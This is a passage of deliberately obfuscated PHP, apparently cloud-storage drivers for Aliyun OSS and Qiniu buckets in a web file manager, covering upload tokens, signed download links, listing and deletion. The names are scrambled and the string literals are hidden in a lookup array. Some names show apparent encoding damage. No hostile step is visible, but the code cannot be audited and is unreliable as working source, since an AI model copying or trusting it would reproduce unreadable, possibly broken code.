array($’…ü±Ÿ§[242] => $°‹®Á¦», $’…ü±Ÿ§[233] => $¯úÏİ¶“[$’…ü±Ÿ§[233]], $’…ü±Ÿ§[244] => $äúÉËËä); } public function download($â§ä‘æ, $üÎÇ…ı) { if ($this->isFolder($â§ä‘æ)) { return !1; } try { $ô¸ë«¦ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $üÎÇ…ı); $ô¸ë«¦ = $this->trafficLimit($_SERVER[¯µç›È¢][120], $ô¸ë«¦); $this->client->getObject($this->bucket, $this->pathEncode($â§ä‘æ), $ô¸ë«¦); } catch (OSS\Core\OssException $ ˜Ö—İ”) { return !1; } return $üÎÇ…ı; } public function fileSubstr($ŞàÔ¼—Æ, $ñ•çÍùı = 0, $ß™îƒÀ = false) { if ($ñ•çÍùı === -1) { $àå¯Øì  = array(); } else { if ($ß™îƒÀ === !1) { $àì¬Öåœ = $this->size($ŞàÔ¼—Æ); } else { $àì¬Öåœ = $ñ•çÍùı + $ß™îƒÀ - 1; } $àå¯Øì  = array(OSS\OssClient::OSS_RANGE => "{$ñ•çÍùı}\55{$àì¬Öåœ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($ŞàÔ¼—Æ), $àå¯Øì ); } catch (OSS\Core\OssException $Œ”Ü€çÏ) { think_exception($Œ”Ü€çÏ->getMessage()); return !1; } } private function trafficLimit($ÆŠÙ¾Æ, $ªµñ‚®Š = array()) { $Ä÷ëİÁ• =& $_SERVER[¯µç›È¢]; if ($ÆŠÙ¾Æ == $Ä÷ëİÁ•[1419] && $this->isUploadServer() || $ÆŠÙ¾Æ == $Ä÷ëİÁ•[120] && $this->isFileOutServer()) { return $ªµñ‚®Š; } $É ªİñË = floatval($GLOBALS[$Ä÷ëİÁ•[6]][$Ä÷ëİÁ•[100]][$Ä÷ëİÁ•[118]][$ÆŠÙ¾Æ]) * 1024 * 1024 * 8; if (!$É ªİñË) { return $ªµñ‚®Š; } $É ªİñË = $É ªİñË < 819200 ? 819200 : ($É ªİñË > 838860800 ? 838860800 : $É ªİñË); $ªµñ‚®Š[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($É ªİñË); return $ªµñ‚®Š; } public function link($ÊÒ¾Çš¥, $ÈšÊâÄ˜ = array()) { $ØŒ„Çı¯ =& $_SERVER[¯µç›È¢]; if (!$this->exist($ÊÒ¾Çš¥) || $this->isFolder($ÊÒ¾Çš¥)) { return !1; } try { $ÈšÊâÄ˜ = $this->trafficLimit($ØŒ„Çı¯[120], $ÈšÊâÄ˜); $Ù³ô ¨ƒ = $this->client->signUrl($this->bucket, $this->pathEncode($ÊÒ¾Çš¥), 3600 * 12, $ØŒ„Çı¯[239], $ÈšÊâÄ˜); return $this->getCdnLink($Ù³ô ¨ƒ); } catch (OSS\Core\OssException $«ÑÉÈ…‡) { return !1; } } public function fileOut($Âú¯ÎÅ÷, $ú—Ğº°ª = false, $ã£§³Û– = false, $„¨ºù×² = '') { $û›Êçé± =& $_SERVER[¯µç›È¢]; if ($this->isFileOutServer()) { return $this->fileOutServer($Âú¯ÎÅ÷, $ú—Ğº°ª, $ã£§³Û–, $„¨ºù×²); } if (!$ã£§³Û–) { $ã£§³Û– = $this->pathThis($Âú¯ÎÅ÷); } $ã£§³Û– = rawurlencode($ã£§³Û–); $ÅÖ‘¹—Ó = get_file_mime(get_path_ext($ã£§³Û–)); if ($ÅÖ‘¹—Ó == $û›Êçé±[226]) { return parent::fileOut($Âú¯ÎÅ÷, $ú—Ğº°ª, $ã£§³Û–, $„¨ºù×²); } $ú—Ğº°ª = $ú—Ğº°ª ? $û›Êçé±[1430] : $û›Êçé±[1431]; $àâ¥¹¿İ = array(OSS\OssClient::OSS_SUB_RESOURCE => $û›Êçé±[1432] . rawurlencode("{$ú—Ğº°ª}\x3b\x66\x69\154\x65\x6e\141\x6d\145\75{$ã£§³Û–}")); $àâ¥¹¿İ[OSS\OssClient::OSS_SUB_RESOURCE] .= $û›Êçé±[1433] . rawurlencode($ÅÖ‘¹—Ó); $³Ìï¾Ğ™ = $this->link($Âú¯ÎÅ÷, $àâ¥¹¿İ); $this->fileOutLink($³Ìï¾Ğ™); } public function fileOutServer($’‡°ŞÛº, $ÆŒÕûÒÒ = false, $¬ÆñØ—Ş = false, $Ãéò÷Òª = '') { parent::fileOut($’‡°ŞÛº, $ÆŒÕûÒÒ, $¬ÆñØ—Ş, $Ãéò÷Òª); } public function fileOutImage($šĞƒóÜÑ, $À”ìÉÏ = 250) { $ıëß‚îñ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[¯µç›È¢][1434] . $À”ìÉÏ); $ºÏî—Û· = $this->link($šĞƒóÜÑ, $ıëß‚îñ); $this->fileOutLink($ºÏî—Û·); } public function fileOutImageServer($¹¥„ÚÍÔ, $‹¸€¾ø‘ = 250) { parent::fileOutImage($¹¥„ÚÍÔ, $‹¸€¾ø‘); } public function fileOutLink($˜•²˜«) { $×‡ƒÓŒƒ =& $_SERVER[¯µç›È¢]; if (!$this->isCdnHost() && substr($˜•²˜«, 0, 7) == $×‡ƒÓŒƒ[1335]) { $˜•²˜« = $×‡ƒÓŒƒ[1336] . substr($˜•²˜«, 7); } header($×‡ƒÓŒƒ[172] . $˜•²˜«); die; } public function hashMd5($î¡úóİ¬, $‡êìÈìÖ = '') { $¥î¢‹õá =& $_SERVER[¯µç›È¢]; $ß‚éàø = $this->_objectMeta($î¡úóİ¬); if (!$ß‚éàø) { return $¥î¢‹õá[12]; } if (!isset($ß‚éàø[$¥î¢‹õá[1409]]) && !empty($‡êìÈìÖ)) { $ÙÛ˜¿° = $this->updateObjMeta($î¡úóİ¬, array($¥î¢‹õá[1409] => $‡êìÈìÖ)); $ß‚éàø[$¥î¢‹õá[1409]] = $ÙÛ˜¿° ? $‡êìÈìÖ : $¥î¢‹õá[12]; } return isset($ß‚éàø[$¥î¢‹õá[1409]]) ? strtolower($ß‚éàø[$¥î¢‹õá[1409]]) : $¥î¢‹õá[12]; } public function size($şÖÔø¢Ş) { $Ôˆ®ƒ© = $this->objectMeta($şÖÔø¢Ş); return $Ôˆ®ƒ© ? $Ôˆ®ƒ©[$_SERVER[¯µç›È¢][90]] : 0; } public function info($¼øŒûÑ) { if ($this->isFolder($¼øŒûÑ)) { return $this->folderInfo($¼øŒûÑ); } else { if ($this->isFile($¼øŒûÑ)) { return $this->fileInfo($¼øŒûÑ); } } return !1; } public function exist($ÓûïˆÊ…) { return $this->isFile($ÓûïˆÊ…) || $this->isFolder($ÓûïˆÊ…); } public function isFile($‰Ùƒ†‚ó) { return !$this->isFolder($‰Ùƒ†‚ó) && $this->objectMeta($‰Ùƒ†‚ó); } public function isFolder($Š€Íóş˜) { return $this->cacheMethod($_SERVER[¯µç›È¢][212], $Š€Íóş˜); } protected function objectMeta($Œá’íÓÑ) { return $this->cacheMethod($_SERVER[¯µç›È¢][213], $Œá’íÓÑ); } protected function _objectMeta($ÌÒ§½³×) { $Ì“Â¾Æë =& $_SERVER[¯µç›È¢]; try { $¨ÏáîÏª = $this->client->getObjectMeta($this->bucket, $this->pathEncode($ÌÒ§½³×)); } catch (OSS\Core\OssException $ê£•²Ø±) { $¨ÏáîÏª = !1; } if ($¨ÏáîÏª) { $¨ÏáîÏª[$Ì“Â¾Æë[90]] = intval($¨ÏáîÏª[$Ì“Â¾Æë[1407]]); } return $¨ÏáîÏª; } protected function _isFolder($÷§ú Åá) { $ë¤½˜´í =& $_SERVER[¯µç›È¢]; if ($÷§ú Åá == $ë¤½˜´í[12] || $÷§ú Åá == $ë¤½˜´í[8]) { return !0; } $£™¶Ì™ = array($ë¤½˜´í[1403] => $ë¤½˜´í[8], $ë¤½˜´í[1404] => rtrim($÷§ú Åá, $ë¤½˜´í[8]) . $ë¤½˜´í[8], $ë¤½˜´í[1405] => 1, $ë¤½˜´í[1406] => $ë¤½˜´í[12]); $¤•î› = $this->client->listObjects($this->bucket, $£™¶Ì™); if ($¤•î›->getObjectList() || $¤•î›->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($ĞÎ˜‹ƒƒ) { parent::__construct(); require_once SDK_DIR . $_SERVER[¯µç›È¢][1435]; $this->_init($ĞÎ˜‹ƒƒ); } public function _init($İ§òÔ†) { $â€ª¸ë¸ =& $_SERVER[¯µç›È¢]; foreach ($İ§òÔ† as $äÆº—í² => $’¤¼Û˜š) { if (isset($this->{$äÆº—í²})) { $this->{$äÆº—í²} = $’¤¼Û˜š; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($â€ª¸ë¸[1436] . LNG($â€ª¸ë¸[1394])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($ºÉìĞ„Ô, $ ÷Åš±ä = '', $í»ª”Ïı = REPEAT_RENAME) { if ($this->setContent($ºÉìĞ„Ô, $ ÷Åš±ä)) { return $this->getPathOuter($ºÉìĞ„Ô); } return !1; } public function mkdir($ƒğæˆ–¨, $Šœæî± = REPEAT_SKIP) { $ïäşœßï =& $_SERVER[¯µç›È¢]; $«Ğ…ä§Û = trim($ƒğæˆ–¨, $ïäşœßï[8]); if ($this->_isFolder($«Ğ…ä§Û)) { return $this->getPathOuter($«Ğ…ä§Û); } $ƒğæˆ–¨ = $«Ğ…ä§Û . $ïäşœßï[8]; $ÕÊ¤ÑÉ‰ = get_path_this($«Ğ…ä§Û); $•°ò‡úÒ = $ƒğæˆ–¨ . $ÕÊ¤ÑÉ‰; if (!$this->mkfile($•°ò‡úÒ)) { return !1; } if (!$this->moveFile($•°ò‡úÒ, $ƒğæˆ–¨)) { $this->delFile($•°ò‡úÒ); return !1; } return $this->getPathOuter($«Ğ…ä§Û); } public function copyFile($²‚§åÁš, $Ö ƒšÔ¶) { $µ®Ê¤¶É = $this->bucketManager->copy($this->bucket, $²‚§åÁš, $this->bucket, $Ö ƒšÔ¶, !0); return $µ®Ê¤¶É ? !1 : $this->getPathOuter($Ö ƒšÔ¶); } public function moveFile($…´·Á³‰, $±×¿Œìä) { $ï—Âîµ­ = $this->bucketManager->move($this->bucket, $…´·Á³‰, $this->bucket, $±×¿Œìä, !0); return $ï—Âîµ­ ? !1 : $this->getPathOuter($±×¿Œìä); } public function delFile($ÜÃ’èÍâ) { if (!$this->exist($ÜÃ’èÍâ)) { return !0; } $²õÙù× = $this->bucketManager->delete($this->bucket, $ÜÃ’èÍâ); return $²õÙù× ? !1 : !0; } public function delFolder($ëÏ°»„) { $½‰ò¸ùª =& $_SERVER[¯µç›È¢]; if (!$this->exist($ëÏ°»„)) { return !0; } $this->listItemCache = !1; $òĞº­‡™ = $this->fileList($ëÏ°»„); $this->listItemCache = !0; $²ÌŠĞ° = trim($ëÏ°»„, $½‰ò¸ùª[8]) . $½‰ò¸ùª[8]; if (!empty($ëÏ°»„) && $ëÏ°»„ !== $½‰ò¸ùª[204] && !in_array($²ÌŠĞ°, $òĞº­‡™[$½‰ò¸ùª[87]])) { $òĞº­‡™[$½‰ò¸ùª[87]][] = $²ÌŠĞ°; } $Ê¨˜¢ûâ = $this->delByBatch($òĞº­‡™[$½‰ò¸ùª[86]]); if (!$Ê¨˜¢ûâ) { return !1; } $Ê¨˜¢ûâ = $this->delByBatch($òĞº­‡™[$½‰ò¸ùª[87]]); if (!$Ê¨˜¢ûâ) { return !1; } return $this->delFile($²ÌŠĞ°); } private function delByBatch($´ÉÃÉ€Ã) { foreach (array_chunk($´ÉÃÉ€Ã, 1000) as $öÔù‘ãŸ) { $ß»²¨ÆĞ = $this->bucketManager->buildBatchDelete($this->bucket, $öÔù‘ãŸ); list($¿µ‘ŞÁ, $×¦Ñ•‚ê) = $this->bucketManager->batch($ß»²¨ÆĞ); if ($×¦Ñ•‚ê) { return !1; } } return !0; } public function rename($¯çƒšø—, $Æ‡Åñ«®) { return $this->renameObject($¯çƒšø—, $Æ‡Åñ«®); } public function fileInfo($ä‚³Î·•, $÷À•¬Øç = false, $ó“©ù½‹ = array()) { $çËª®åß =& $_SERVER[¯µç›È¢]; $…Óıº´ = array($çËª®åß[32] => $this->pathThis($ä‚³Î·•), $çËª®åß[88] => $this->getPathOuter($çËª®åß[8] . $ä‚³Î·•), $çËª®åß[33] => $çËª®åß[206], $çËª®åß[90] => isset($ó“©ù½‹[$çËª®åß[1437]]) ? $ó“©ù½‹[$çËª®åß[1437]] : 0, $çËª®åß[181] => $this->ext($ä‚³Î·•)); if ($÷À•¬Øç) { return $…Óıº´; } $…Óıº´[$çËª®åß[207]] = $…Óıº´[$çËª®åß[96]] = 0; $…Óıº´[$çËª®åß[208]] = $…Óıº´[$çËª®åß[209]] = !0; if (empty($ó“©ù½‹)) { $ó“©ù½‹ = $this->objectMeta($ä‚³Î·•); if (!$ó“©ù½‹) { return $…Óıº´; } } if (isset($ó“©ù½‹[$çËª®åß[1438]])) { $…Óıº´[$çËª®åß[96]] = substr($ó“©ù½‹[$çËª®åß[1438]] . $çËª®åß[12], 0, 10); } if (isset($ó“©ù½‹[$çËª®åß[1437]])) { $…Óıº´[$çËª®åß[90]] = $ó“©ù½‹[$çËª®åß[1437]]; } return $…Óıº´; } public function folderInfo($†÷ÛŸÒÖ, $Ş§°Ìù· = false) { $şìËƒºœ =& $_SERVER[¯µç›È¢]; $òÚ¸ƒó = array($şìËƒºœ[32] => $this->pathThis($†÷ÛŸÒÖ), $şìËƒºœ[88] => $this->getPathOuter($şìËƒºœ[8] . $†÷ÛŸÒÖ), $şìËƒºœ[33] => $şìËƒºœ[89]); if ($Ş§°Ìù·) { return $òÚ¸ƒó; } $òÚ¸ƒó[$şìËƒºœ[207]] = $òÚ¸ƒó[$şìËƒºœ[96]] = 0; $òÚ¸ƒó[$şìËƒºœ[208]] = $òÚ¸ƒó[$şìËƒºœ[209]] = !0; $†÷ÛŸÒÖ = rtrim($†÷ÛŸÒÖ, $şìËƒºœ[8]) . $şìËƒºœ[8]; $çÉœ×Ÿ† = $this->objectMeta($†÷ÛŸÒÖ); if (isset($çÉœ×Ÿ†[$şìËƒºœ[1438]])) { $òÚ¸ƒó[$şìËƒºœ[96]] = substr($çÉœ×Ÿ†[$şìËƒºœ[1438]] . $şìËƒºœ[12], 0, 10); } return $òÚ¸ƒó; } public function listPath($˜¹ÚŒà´, $±’ï»«¤ = false) { $ÛÂÇÚ™Š =& $_SERVER[¯µç›È¢]; $£©É‚Ê¨ = $this->fileList($˜¹ÚŒà´, $ÛÂÇÚ™Š[8], !0); foreach ($£©É‚Ê¨[$ÛÂÇÚ™Š[87]] as $İ­š½óÈ => $î¿Û–È–) { $£©É‚Ê¨[$ÛÂÇÚ™Š[87]][$İ­š½óÈ] = $this->folderInfo($î¿Û–È–, $±’ï»«¤); } foreach ($£©É‚Ê¨[$ÛÂÇÚ™Š[86]] as $İ­š½óÈ => $î¿Û–È–) { $£©É‚Ê¨[$ÛÂÇÚ™Š[86]][$İ­š½óÈ] = $this->fileInfo($î¿Û–È–[$ÛÂÇÚ™Š[105]], $±’ï»«¤, $î¿Û–È–); } return $£©É‚Ê¨; } public function has($¨à±İİç, $Ê¨ƒ¾ƒ™ = false, $§åÆ™‡å = true) { $¥Ãã¬Š =& $_SERVER[¯µç›È¢]; $¨à±İİç = trim($¨à±İİç, $¥Ãã¬Š[8]); $‰«ùÇëë = empty($¨à±İİç) && $¨à±İİç !== $¥Ãã¬Š[204] ? $¥Ãã¬Š[12] : $¨à±İİç . $¥Ãã¬Š[8]; $ÓİÕ§‚Â = $¥Ãã¬Š[12]; $£ã‹’Œ× = 500; $Æ°ïÒ¦• = $¥Ãã¬Š[8]; $ÁÏÖ’Ê = $ş×Êîï = 0; while (!0) { check_abort(); list($¨¿Öù»º, $è¿ô‹‘¯) = $this->bucketManager->listFiles($this->bucket, $‰«ùÇëë, $ÓİÕ§‚Â, $£ã‹’Œ×, $Æ°ïÒ¦•); if ($è¿ô‹‘¯) { break; } $ÓİÕ§‚Â = array_key_exists($¥Ãã¬Š[1406], $¨¿Öù»º) ? $ÓİÕ§‚Â = $¨¿Öù»º[$¥Ãã¬Š[1439]] : $¥Ãã¬Š[12]; if ($Ê¨ƒ¾ƒ™) { if (!empty($¨¿Öù»º[$¥Ãã¬Š[1440]])) { $ÁÏÖ’Ê += count($¨¿Öù»º[$¥Ãã¬Š[1440]]); } if (!empty($¨¿Öù»º[$¥Ãã¬Š[1441]])) { $ş×Êîï += count($¨¿Öù»º[$¥Ãã¬Š[1441]]); } if ($ÓİÕ§‚Â === $¥Ãã¬Š[12]) { break; } continue; } if ($§åÆ™‡å) { if (!empty($¨¿Öù»º[$¥Ãã¬Š[1440]])) { return !0; } } else { if (!empty($¨¿Öù»º[$¥Ãã¬Š[1441]])) { return !0; } } if ($ÓİÕ§‚Â === $¥Ãã¬Š[12]) { break; } } if ($Ê¨ƒ¾ƒ™) { return array($¥Ãã¬Š[216] => $ÁÏÖ’Ê, $¥Ãã¬Š[217] => $ş×Êîï); } return !1; } public function listAll($œÅòá®„) { $íŞîñÙÛ =& $_SERVER[¯µç›È¢]; $Ï’Ü¾„Ö = $this->fileList($œÅòá®„, $íŞîñÙÛ[12], !0); $íµ€†³ = array(); foreach ($Ï’Ü¾„Ö[$íŞîñÙÛ[86]] as $„ùº·Šè) { $íµ€†³[$„ùº·Šè[$íŞîñÙÛ[105]]] = $„ùº·Šè[$íŞîñÙÛ[90]]; } foreach ($Ï’Ü¾„Ö[$íŞîñÙÛ[87]] as $„ùº·Šè) { if (is_string($„ùº·Šè)) { $íµ€†³[$„ùº·Šè] = 0; } } return $this->listAllFiles($œÅòá®„, array_keys($íµ€†³), $íµ€†³); } private function fileList($²ö½°Ö¯, $ÔâµÀÈ³ = '', $ËÔœÖûÁ = 0) { $«Ÿ™şÑ =& $_SERVER[¯µç›È¢]; $²ö½°Ö¯ = trim($²ö½°Ö¯, $«Ÿ™şÑ[8]); $ğñÂçäå = empty($²ö½°Ö¯) && $²ö½°Ö¯ !== $«Ÿ™şÑ[204] ? $«Ÿ™şÑ[12] : $²ö½°Ö¯ . $«Ÿ™şÑ[8]; $å“šŞÕÌ = $«Ÿ™şÑ[12]; $óû€å„İ = 1000; $óš¶¾Ï = $this->listItemCache === !1 ? !1 : !0; $‹¬¿×‡ = $¤Â¥Ï¬Î = array(); while (!0) { check_abort(); list($ã ±˜é¹, $Î­¨Úœ) = $this->bucketManager->listFiles($this->bucket, $ğñÂçäå, $å“šŞÕÌ, $óû€å„İ, $ÔâµÀÈ³); if ($Î­¨Úœ) { break; } $å“šŞÕÌ = array_key_exists($«Ÿ™şÑ[1406], $ã ±˜é¹) ? $å“šŞÕÌ = $ã ±˜é¹[$«Ÿ™şÑ[1439]] : $«Ÿ™şÑ[12]; $±Ò½£Ÿ÷ = isset($ã ±˜é¹[$«Ÿ™şÑ[1440]]) ? $ã ±˜é¹[$«Ÿ™şÑ[1440]] : array(); $ÈºøîÈİ = isset($ã ±˜é¹[$«Ÿ™şÑ[1441]]) ? $ã ±˜é¹[$«Ÿ™şÑ[1441]] : array(); foreach ($±Ò½£Ÿ÷ as $ÜşÛçŠ) { if ($ÜşÛçŠ[$«Ÿ™şÑ[105]] == $ğñÂçäå) { continue; } $ºç·¥± = $ÜşÛçŠ[$«Ÿ™şÑ[105]]; $¨ü¥­–ï = $ÜşÛçŠ[$«Ÿ™şÑ[1437]]; $ÜşÛçŠ[$«Ÿ™şÑ[90]] = $¨ü¥­–ï; $êÉÏßÌ² = $¨ü¥­–ï == 0 && substr($ºç·¥±, strlen($ºç·¥±) - 1, 1) == $«Ÿ™şÑ[8] ? !0 : !1; if ($óš¶¾Ï) { $this->cacheMethod($«Ÿ™şÑ[212], $ºç·¥±, $êÉÏßÌ²); $this->cacheMethod($«Ÿ™şÑ[213], $ºç·¥±, $ÜşÛçŠ); } if ($êÉÏßÌ²) { $‹¬¿×‡[] = $ºç·¥±; continue; } $¤Â¥Ï¬Î[] = $ËÔœÖûÁ ? $ÜşÛçŠ : $ºç·¥±; } foreach ($ÈºøîÈİ as $ºç·¥±) { if ($ºç·¥± == $ğñÂçäå) { continue; } $‹¬¿×‡[] = $ºç·¥±; if ($óš¶¾Ï) { $this->cacheMethod($«Ÿ™şÑ[212], $ºç·¥±, !0); } } if ($å“šŞÕÌ === $«Ÿ™şÑ[12]) { break; } } if ($óš¶¾Ï) { $this->cacheMethod($«Ÿ™şÑ[212], $²ö½°Ö¯, !0); } return array($«Ÿ™şÑ[87] => $‹¬¿×‡, $«Ÿ™şÑ[86] => $¤Â¥Ï¬Î); } public function canRead($–¹„²ë†) { return $this->exist($–¹„²ë†) ? !0 : !1; } public function canWrite($ğˆÚëõ¸) { return $this->exist($ğˆÚëõ¸) ? !0 : !1; } public function getContent($¬ê¬£Éä) { return $this->fileSubstr($¬ê¬£Éä, 0, -1); } public function setContent($ÏÇ±•ÆŒ, $§×ÖáûŒ = '') { $— £‡ä« = $this->tempFile($this->pathThis($ÏÇ±•ÆŒ)); file_put_contents($— £‡ä«, $§×ÖáûŒ); if ($this->upload($ÏÇ±•ÆŒ, $— £‡ä«)) { $this->tempFileRemve($— £‡ä«); return !0; } return !1; } public function refreshUrls($á¤›¹ú½) { $¸˜ä¶‹  =& $_SERVER[¯µç›È¢]; $ÌÀø·¥¾ = array(); if (is_array($á¤›¹ú½)) { foreach ($á¤›¹ú½ as $™¬ÔË€) { $ÌÀø·¥¾[] = $this->link($™¬ÔË€); } } else { $ÌÀø·¥¾[] = $this->link($á¤›¹ú½); } $ˆ™˜„ïÄ = new Qiniu\Cdn\CdnManager($this->auth); list($úñ¼ş¡Û, $¿Ò€èáú) = $ˆ™˜„ïÄ->refreshUrls($ÌÀø·¥¾); if ($¿Ò€èáú) { return !1; } return $úñ¼ş¡Û[$¸˜ä¶‹ [1193]] == $¸˜ä¶‹ [777] ? !0 : !1; } public function fileSubstr($–ßé» ü, $ŠÇ«ÌÓ², $½Æ¾ÄÉá) { $¼Î—ƒ¯× =& $_SERVER[¯µç›È¢]; if (!($ªµ¿¶İø = $this->link($–ßé» ü))) { return !1; } $á„ÃÉ’ß = !1; if ($½Æ¾ÄÉá > 0) { $Ó’£üïÛ = $ŠÇ«ÌÓ² + $½Æ¾ÄÉá - 1; $á„ÃÉ’ß = array($¼Î—ƒ¯×[1442] . $ŠÇ«ÌÓ² . $¼Î—ƒ¯×[465] . $Ó’£üïÛ); } $Ö’ÆÈ£¤ = url_request($ªµ¿¶İø, $¼Î—ƒ¯×[239], !1, $á„ÃÉ’ß); return $Ö’ÆÈ£¤[$¼Î—ƒ¯×[767]] ? $Ö’ÆÈ£¤[$¼Î—ƒ¯×[1203]] : !1; } public function upload($òã«ø‹Ü, $¦Ê‘Ñº, $¼ŞÆûÁ = false, $àÕ¶âĞÔ = REPEAT_REPLACE) { $ı¦¤Ïö = new Qiniu\Storage\UploadManager(); $å³ºœÛÖ = $this->auth->uploadToken($this->bucket, $òã«ø‹Ü); $üş§·´ƒ = get_file_mime(get_path_ext($¦Ê‘Ñº)); list($„¦×‘Û, $±ÎÕ€©¬) = $ı¦¤Ïö->putFile($å³ºœÛÖ, $òã«ø‹Ü, $¦Ê‘Ñº, null, $üş§·´ƒ); return $±ÎÕ€©¬ ? !1 : $this->getPathOuter($òã«ø‹Ü); } public function uploadFormData($ø¼µµÇÉ, $Öâãö‡ = 3600) { return $this->uploadToken($ø¼µµÇÉ, $Öâãö‡); } public function multiUploadFormData($¼ÕÉÊÒ, $ÀãÌ¸û€ = 3600) { return $this->uploadToken($¼ÕÉÊÒ, $ÀãÌ¸û€); } private function uploadToken($œÅ‡¿®™, $ÈÊõªŠ´ = 3600) { $ı®¸‰ö =& $_SERVER[¯µç›È¢]; $­Ö·Í¯ = $ÈÊõªŠ´; $Š¸ˆÔ¹à = array($ı®¸‰ö[1443] => $ı®¸‰ö[1444]); $Ÿ¥ËØ ¾ = $œÅ‡¿®™; $´ûşâ­ı = $this->auth->uploadToken($this->bucket, $Ÿ¥ËØ ¾, $­Ö·Í¯, $Š¸ˆÔ¹à, !0); $œŒÈäÓ´ = empty($this->region) || $this->region == $ı®¸‰ö[1445] ? $ı®¸‰ö[12] : $ı®¸‰ö[465] . $this->region; $­Š·‹¦Õ = http_type() . "\72\x2f\57\x75\160\x6c\x6f\141\x64{$œŒÈäÓ´}\x2e\x71\x69\x6e\151\165\160\x2e\143\157\x6d\57"; return array($ı®¸‰ö[1446] => $´ûşâ­ı, $ı®¸‰ö[1447] => $­Š·‹¦Õ); } public function download($×—êÈúì, $ë¯ÎíıŠ) { $À—çáŒò = IO::getPathInner(IO::mkfile($ë¯ÎíıŠ)); if (!($«¥ŠÃ¬¡ = $this->link($×—êÈúì))) { return !1; } $–—µŠÒ = 0; $³”™ˆé† = 1024 * 200; $Ò±¥ù ¶ = fopen($À—çáŒò, $_SERVER[¯µç›È¢][1448]); while (!0) { $±ú™¤‹ = $this->fileSubstr($×—êÈúì, $–—µŠÒ, $³”™ˆé†); if ($±ú™¤‹ === !1) { return !1; } fwrite($Ò±¥ù ¶, $±ú™¤‹); $–—µŠÒ += $³”™ˆé†; if (strlen($±ú™¤‹) < $³”™ˆé†) { break; } } fclose($Ò±¥ù ¶); return $ë¯ÎíıŠ; } public function link($íúœ¼°†, $º¥âÓ¯‘ = '') { if (!$this->isFile($íúœ¼°†)) { return !1; } $¹Œ­Ë²› = $this->getHost() . $_SERVER[¯µç›È¢][8] . $this->pathEncode($íúœ¼°†) . $º¥âÓ¯‘; return $this->auth->privateDownloadUrl($¹Œ­Ë²›, 3600 * 12); } public function fileOut($ò‡ŞÎÌÒ, $¡ç´À Û = false, $˜˜Êïìß = false, $‡¶ô¨ = '') { $œ®ÔÆ =& $_SERVER[¯µç›È¢]; if ($this->isFileOutServer()) { return $this->fileOutServer($ò‡ŞÎÌÒ, $¡ç´À Û, $˜˜Êïìß, $‡¶ô¨); } if (!$˜˜Êïìß) { $˜˜Êïìß = $this->pathThis($ò‡ŞÎÌÒ); } $£–â ¬ò = $¡ç´À Û ? $œ®ÔÆ[1449] . rawurlencode($˜˜Êïìß) : $œ®ÔÆ[12]; $’˜ÒÎÎœ = $this->link($ò‡ŞÎÌÒ, $£–â ¬ò); $this->fileOutLink($’˜ÒÎÎœ); } public function fileOutServer($€Ê´ı©ö, $¦…åù³— = false, $¾óşÜ©Á = false, $†©ª„ì = '') { parent::fileOut($€Ê´ı©ö, $¦…åù³—, $¾óşÜ©Á, $†©ª„ì); } public function fileOutImage($òÇ“…­, $ûóúáì‹ = 250) { $óâşÇî´ = $this->link($òÇ“…­, $_SERVER[¯µç›È¢][1450] . $ûóúáì‹); $this->fileOutLink($óâşÇî´); } public function fileOutImageServer($·É›œ†à, $İ‡Ëµá³ = 250) { parent::fileOutImage($·É›œ†à, $İ‡Ëµá³); } public function hashMd5($¼»•Ì‹ç) { $«úÖŠëú =& $_SERVER[¯µç›È¢]; $÷ï¢£ı = $this->objectMeta($¼»•Ì‹ç); return isset($÷ï¢£ı[$«úÖŠëú[221]]) ? $÷ï¢£ı[$«úÖŠëú[221]] : !1; $¡ä”¬×® = $this->link($¼»•Ì‹ç, $«úÖŠëú[1451]); } public function size($±æÆñ¢ù) { $ïÊ½ì¹ = $this->objectMeta($±æÆñ¢ù); return $ïÊ½ì¹ ? $ïÊ½ì¹[$_SERVER[¯µç›È¢][90]] : 0; } public function info($ÄŞ§°½) { if ($this->isFolder($ÄŞ§°½)) { return $this->folderInfo($ÄŞ§°½); } else { if ($this->isFile($ÄŞ§°½)) { return $this->fileInfo($ÄŞ§°½); } } return !1; } public function exist($¾ğ–”°) { return $this->isFile($¾ğ–”°) || $this->isFolder($¾ğ–”°); } public function isFile($×ŠÆ•Ïê) { return !$this->isFolder($×ŠÆ•Ïê) && $this->objectMeta($×ŠÆ•Ïê); } public function isFolder($«·Á¥¢Ñ) { return $this->cacheMethod($_SERVER[¯µç›È¢][212], $«·Á¥¢Ñ); } protected function objectMeta($ª¯­ğù) { return $this->cacheMethod($_SERVER[¯µç›È¢][213], $ª¯­ğù); } protected function _objectMeta($Òˆ™„à) { $¡°È÷ˆõ =& $_SERVER[¯µç›È¢]; list($ÁÈÆ¬î¼, $Ñš å) = $this->bucketManager->stat($this->bucket, $Òˆ™„à); if ($ÁÈÆ¬î¼) { $ÁÈÆ¬î¼[$¡°È÷ˆõ[90]] = intval($ÁÈÆ¬î¼[$¡°È÷ˆõ[1437]]); } return $ÁÈÆ¬î¼; } protected function _isFolder($­ô”ùˆÃ) { $¡¾ıñÌø =& $_SERVER[¯µç›È¢]; if ($­ô”ùˆÃ == $¡¾ıñÌø[12] || $­ô”ùˆÃ == $¡¾ıñÌø[8]) { return !0; } list($Šß„×ì¼, $€¶Å¼£­) = $this->bucketManager->listFiles($this->bucket, trim($­ô”ùˆÃ, $¡¾ıñÌø[8]) . $¡¾ıñÌø[8], $¡¾ıñÌø[12], 1, $¡¾ıñÌø[8]); return !empty($Šß„×ì¼[$¡¾ıñÌø[1440]]) || !empty($Šß„×ì¼[$¡¾ıñÌø[1441]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($á×ó±¤ø) { parent::__construct($á×ó±¤ø); } public function uploadFormData($¸ÕÃóÍ–, $¤¢¬ê¨ë = 3600) { 